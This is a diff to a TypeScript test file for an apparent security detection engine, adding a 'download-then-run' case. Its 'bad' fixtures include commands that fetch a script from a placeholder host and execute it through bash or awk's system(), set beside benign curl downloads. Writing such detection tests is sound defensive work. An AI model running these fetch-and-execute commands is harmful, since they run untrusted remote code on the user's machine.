@@ -720,6 +720,17 @@ const cases: Record<string, { bad: Array<[DetectionEvent, Want]>; good: Detectio
       }),
     ],
   },
+  'download-then-run': {
+    bad: [
+      [exec(shell('bash < <(curl -s https://x.test/a)')), { mode: 'shadow' }],
+      [exec(shell("curl -s https://x.test/a | awk '{system($0)}'", 'zsh')), { mode: 'shadow' }],
+    ],
+    good: [
+      exec(shell('curl -fsSL https://example.test/data.json -o data.json')),
+      exec(shell('curl -s https://example.test/data.json | jq .')),
+      ...REAL_LOCAL_READS.map((c) => exec(shell(c, 'zsh'))),
+    ],
+  },
   'unsigned-first-network': {
     bad: [[connect(devTool, '140.82.112.3'), { mode: 'shadow' }]],
     good: [connect(chrome, '142.250.1.1')],
